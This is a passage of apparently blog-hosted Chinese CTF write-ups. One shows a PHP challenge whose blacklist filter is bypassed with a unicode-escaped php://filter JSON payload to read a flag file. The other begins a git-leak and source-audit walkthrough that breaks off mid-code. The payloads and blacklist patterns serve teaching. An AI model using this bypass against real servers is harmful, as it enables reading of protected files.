class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// åˆ¤æ–­sourceæ­¤å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™è¿”å›false,ä¸ä¸ºç©ºåˆ™å±•ç¤ºè„šæœ¬ä»£ç ï¼ŒåŒæ—¶é€€å‡ºè„šæœ¬</span><br><span class="hljs-comment">// æ‰€ä»¥sourceè¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-comment">// è®¾ç½®é»‘åå•å­—ç¬¦ä¸²</span><br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br><span class="hljs-comment">// å°†é»‘åå•æ‰€æœ‰å­—ç¬¦ä¸²æ•´åˆæˆæ­£åˆ™åŒ¹é…</span><br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) <br>  &#123;<span class="hljs-comment">// åˆ¤æ–­$stræ˜¯å¦æœ‰é»‘åå•æ•°æ®</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// è·å–ç”¨æˆ·ä¼ è¾“çš„postè¯·æ±‚çš„å†…å®¹ï¼Œå¯ä»¥æ˜¯ä¼ å‚è¿˜æœ‰jsonæ•°æ®</span><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-comment">// å°†jsonæ•°æ®è½¬åŒ–ä¸ºå…³è”æ•°ç»„çš„å½¢å¼</span><br><span class="hljs-comment">// json_decode()å¯ä»¥è§£æunicodeç¼–ç </span><br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// æ£€æŸ¥$jsonå¯¹è±¡æ˜¯å¦ä¸ºç©ºï¼Œ$jsonæ•°ç»„ä¸­çš„pageå˜é‡æ˜¯å¦ä¸ºç©ºï¼Œä»¥åŠç”¨æˆ·ä¼ è¾“çš„å­—ç¬¦ä¸²å†…å®¹æ˜¯å¦å­˜åœ¨é»‘åå•æ•°æ®</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// è·å–$jsonå…³è”æ•°ç»„ä¸­çš„$pageå˜é‡çš„å†…å®¹</span><br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>   <span class="hljs-comment">//   æ–‡ä»¶æ‰“å¼€å‡½æ•°ï¼ˆå±é™©å‡½æ•°ï¼‰ï¼Œè·å–$pageè·¯å¾„æ‰€æŒ‡å‘çš„æ–‡ä»¶å†…å®¹</span><br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<br>   <span class="hljs-comment">// contentè·å–çš„å†…å®¹ä¸ºç©ºï¼Œæˆ–è€…è·å–çš„$contentçš„å†…å®¹ä¸­å«æœ‰é»‘åå•æ•°æ®åˆ™è¿‡æ»¤   </span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-comment">// å°†HarekazeCTF&#123;xxxxx&#125;å†…å®¹æ›¿æ¢ä¸ºHarekazeCTF&#123;&lt;censored&gt;&#125;</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-comment">// è¾“å‡ºè·å–çš„æ–‡ä»¶å†…å®¹</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]); <br></code></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¿™é‡Œè¦åˆ©ç”¨çš„å±é™©ä»£ç ä¸ºfile_get_contents($page);æ‰€ä»¥æ˜¯åˆ©ç”¨äº†file_get_contents()å‡½æ•°çš„æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨phpä¼ªåè®®(php://filter)è·å–æ–‡ä»¶æ•°æ®æµï¼Œç„¶åé€šè¿‡file_get_contents()è·å–æ‰“å¼€çš„æ–‡ä»¶æ•°æ®æµä¼ é€’ç»™ç›¸åº”çš„å‚æ•°:<br>file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„&#x27;)<br><br>ä½†æ˜¯è¿™é‡Œè¿‡æ»¤äº†phpï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä¼ ä¼ªåè®®ï¼Œé¢˜ç›®åªå¯¹$bodyå˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œæ²¡æœ‰å¯¹$jsonæ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œè¿™å°±å¯ä»¥ä½¿ç”¨unicodeç¼–ç è¿›è¡Œç»•è¿‡ï¼Œè¿™æ˜¯å› ä¸ºå­˜åœ¨json_decode()å¯ä»¥è§£æunicodeç¼–ç å†…å®¹ï¼š<br>$json[&#x27;page&#x27;]=&#x27;php://filter/read=convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„&#x27;<br>=&gt;<br>$body=&#123;&#x27;page&#x27;:unicode(&#x27;php://filter/read=convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„&#x27;)&#125;<br></code></pre></td></tr></table></figure><h2 id="unicodeç¼–ç è„šæœ¬"><a href="#unicodeç¼–ç è„šæœ¬" class="headerlink" title="unicodeç¼–ç è„šæœ¬:"></a>unicodeç¼–ç è„šæœ¬:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unicodeEncrypt</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$str</span>);<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$char</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$i</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$result</span> .= <span class="hljs-string">&#x27;\u&#x27;</span> . <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">mb_convert_encoding</span>(<span class="hljs-variable">$char</span>, <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>, <span class="hljs-string">&#x27;UTF-8&#x27;</span>)));<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-comment">// ç¤ºä¾‹ç”¨æ³•</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>;<br><span class="hljs-variable">$encryptedText</span> = <span class="hljs-title function_ invoke__">unicodeEncrypt</span>(<span class="hljs-variable">$text</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encryptedText</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0072\u0065\u0061\u0064\u003D\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067<br></code></pre></td></tr></table></figure><h2 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload:"></a>æ„é€ payload:</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">POST<span class="hljs-punctuation">:</span><br>Content-Type<span class="hljs-punctuation">:</span> application/json<br><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0072\u0065\u0061\u0064\u003D\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212215242887.png" alt="image-20240212215242887"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&quot;content&quot;:&quot;ZmxhZ3swYjY3ZmRjMS04ZThjLTQxMWUtOTZlNy1hNjA2ZmMzOWFkM2N9Cg==&quot;&#125;<br></code></pre></td></tr></table></figure><h2 id="è§£ç ï¼š"><a href="#è§£ç ï¼š" class="headerlink" title="è§£ç ï¼š"></a>è§£ç ï¼š</h2><p><img src="/images/2024-2-18/image-20240212215359505.png" alt="image-20240212215359505"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;0b67fdc1-8e8c-411e-96e7-a606fc39ad3c&#125;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{0b67fdc1-8e8c-411e-96e7-a606fc39ad3c}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[ç½‘é¼æ¯ 2018]Comment</title>
    <link href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/"/>
    <url>/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/</url>
    
    <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105874485">ç½‘é¼æ¯ 2018]Comment_[ç½‘é¼æ¯ 2018]comment-gitæ³„éœ²éƒ¨åˆ†-CSDNåšå®¢</a></p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16077919.html">BUUCTFé¢˜è§£][ç½‘é¼æ¯ 2018]Comment - Article_kelp - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240206185914016.png" alt="image-20240206185914016"></p><h2 id="å‘ä¸€ä¸ªè´´"><a href="#å‘ä¸€ä¸ªè´´" class="headerlink" title="å‘ä¸€ä¸ªè´´:"></a>å‘ä¸€ä¸ªè´´:</h2><p><img src="/images/2024-2-18/image-20240206190135200.png" alt="image-20240206190135200"></p><p><img src="/images/2024-2-18/image-20240206190153951.png" alt="image-20240206190153951"></p><p>è·³è½¬åˆ°äº†login.phpé¡µé¢ï¼Œéœ€è¦æˆ‘ä»¬å…ˆç™»å½•ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“è´¦æˆ·ä¿¡æ¯</p><h2 id="ä½¿ç”¨dirsearchæŸ¥æ‰¾åå°æ–‡ä»¶"><a href="#ä½¿ç”¨dirsearchæŸ¥æ‰¾åå°æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨dirsearchæŸ¥æ‰¾åå°æ–‡ä»¶:"></a>ä½¿ç”¨dirsearchæŸ¥æ‰¾åå°æ–‡ä»¶:</h2><p><img src="/images/2024-2-18/image-20240206201103518.png" alt="image-20240206201103518"></p><p>å‘ç°å¤§é‡çš„.gitæ–‡ä»¶ï¼ŒçŒœæµ‹ç½‘é¡µå­˜åœ¨.gitæ–‡ä»¶æ³„éœ²</p><h2 id="ä½¿ç”¨githackè·å–æ³„éœ²æ–‡ä»¶"><a href="#ä½¿ç”¨githackè·å–æ³„éœ²æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨githackè·å–æ³„éœ²æ–‡ä»¶:"></a>ä½¿ç”¨githackè·å–æ³„éœ²æ–‡ä»¶:</h2><p>kali:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python2 GitHack.py -u http://91de20fb-1487-499f-9de7-6d8134c660b8.node5.buuoj.cn:81/.git<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206215053245.png" alt="image-20240206215053245"></p><h2 id="ä»£ç å®¡è®¡åˆ†æ"><a href="#ä»£ç å®¡è®¡åˆ†æ" class="headerlink" title="ä»£ç å®¡è®¡åˆ†æ:"></a>ä»£ç å®¡è®¡åˆ†æ:</h2><h3 id="write-do-php"><a href="#write-do-php" class="headerlink" title="write_do.php:"></a>write_do.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-comment">// å¯åŠ¨ä¼šè¯ï¼Œç”¨æˆ·ä¿å­˜é¡µé¢ä¹‹é—´çš„äº¤äº’ä¿¡æ¯</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// å…ˆåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç»ç™»å½•</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-comment">// åˆ¤æ–­å‚æ•°doæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="BPæŠ“å–å‘å¸–çš„æ•°æ®åŒ…"><a href="#BPæŠ“å–å‘å¸–çš„æ•°æ®åŒ…" class="headerlink" title="BPæŠ“å–å‘å¸–çš„æ•°æ®åŒ…:"></a>BPæŠ“å–å‘å¸–çš„æ•°æ®åŒ…:</h3><p><img src="/images/2024-2-18/image-20240206211820455.png" alt="image-20240206211820455"></p><p><strong>æ ¹æ®æˆ‘ä»¬å¯¹webå‰ç«¯çš„äº†è§£ï¼Œæˆ‘ä»¬è¦å‘å¸–çš„æ—¶å€™,æ˜¯å¯åŠ¨äº†writeçš„é€‰é¡¹ï¼ŒåŒæ—¶è·å–äº†æˆ‘ä»¬çš„title&amp;category&amp;contentä¸‰ä¸ªå‚æ•°çš„å€¼ï¼Œä¸€èˆ¬æ¥è¯´è‚¯å®šä¼šæœ‰å¯¹è¾“å…¥å‚æ•°çš„æ“ä½œï¼Œæ¯”å¦‚å†™å…¥æ•°æ®ä¹‹ç±»çš„ï¼Œä½†æ˜¯åœ¨write_do.phpä»£ç ä¸­å´æ˜¯ç©ºç™½çš„å†…å®¹ï¼Œè¿™ææœ‰å¯èƒ½æ˜¯.gitæ³„éœ²çš„æ–‡ä»¶å‘ç”Ÿäº†æŸåï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä¿®å¤</strong></p><h3 id="ä¿®å¤-gitæ³„éœ²æ–‡ä»¶write-do-phpï¼š"><a href="#ä¿®å¤-gitæ³„éœ²æ–‡ä»¶write-do-phpï¼š" class="headerlink" title="ä¿®å¤.gitæ³„éœ²æ–‡ä»¶write_do.phpï¼š"></a>ä¿®å¤.gitæ³„éœ²æ–‡ä»¶write_do.phpï¼š</h3><h4 id="åˆ‡æ¢åˆ°-gitæ³„éœ²æ–‡ä»¶çš„ä¿å­˜æ–‡ä»¶å¤¹ç›®å½•ä¸‹"><a href="#åˆ‡æ¢åˆ°-gitæ³„éœ²æ–‡ä»¶çš„ä¿å­˜æ–‡ä»¶å¤¹ç›®å½•ä¸‹" class="headerlink" title="åˆ‡æ¢åˆ°.gitæ³„éœ²æ–‡ä»¶çš„ä¿å­˜æ–‡ä»¶å¤¹ç›®å½•ä¸‹:"></a>åˆ‡æ¢åˆ°.gitæ³„éœ²æ–‡ä»¶çš„ä¿å­˜æ–‡ä»¶å¤¹ç›®å½•ä¸‹:</h4><p><img src="/images/2024-2-18/image-20240206215203379.png" alt="image-20240206215203379"></p><h4 id="åœ¨è¯¥æ–‡ä»¶ä¸‹è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š"><a href="#åœ¨è¯¥æ–‡ä»¶ä¸‹è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š" class="headerlink" title="åœ¨è¯¥æ–‡ä»¶ä¸‹è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š"></a>åœ¨è¯¥æ–‡ä»¶ä¸‹è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š</h4><p><strong>è¯¥å‘½ä»¤ç”¨äºæŸ¥çœ‹ï¼š</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">git log --all<br>æˆ–<br>git log --reflog<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206215452510.png" alt="image-20240206215452510"></p><p>rootç”¨æˆ·æœ€åæäº¤çš„æ–‡ä»¶ä¿¡æ¯ä¸­æœ‰write_do.phpï¼Œå¯èƒ½å¯¹è¯¥æ–‡ä»¶æœ‰æ›´åŠ å®Œæ•´çš„ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥æ¢å¤ä¸€ä¸‹æœ€åçš„æ–‡ä»¶</p><h4 id="ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¢å¤æœ€åæäº¤çš„æ–‡ä»¶"><a href="#ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¢å¤æœ€åæäº¤çš„æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¢å¤æœ€åæäº¤çš„æ–‡ä»¶:"></a>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¢å¤æœ€åæäº¤çš„æ–‡ä»¶:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206221723755.png" alt="image-20240206221723755"></p><h4 id="å†æ¬¡æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„write-do-phpï¼š"><a href="#å†æ¬¡æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„write-do-phpï¼š" class="headerlink" title="å†æ¬¡æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„write_do.phpï¼š"></a>å†æ¬¡æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„write_do.phpï¼š</h4><p><img src="/images/2024-2-18/image-20240206221658271.png" alt="image-20240206221658271"></p><p><img src="/images/2024-2-18/image-20240206221854959.png" alt="image-20240206221854959"></p><p>æ–‡ä»¶å†…å®¹è¢«ä¿®å¤äº†ï¼ï¼ï¼</p><h4 id="å®Œæ•´çš„write-do-phpï¼š"><a href="#å®Œæ•´çš„write-do-phpï¼š" class="headerlink" title="å®Œæ•´çš„write_do.phpï¼š"></a>å®Œæ•´çš„write_do.phpï¼š</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ 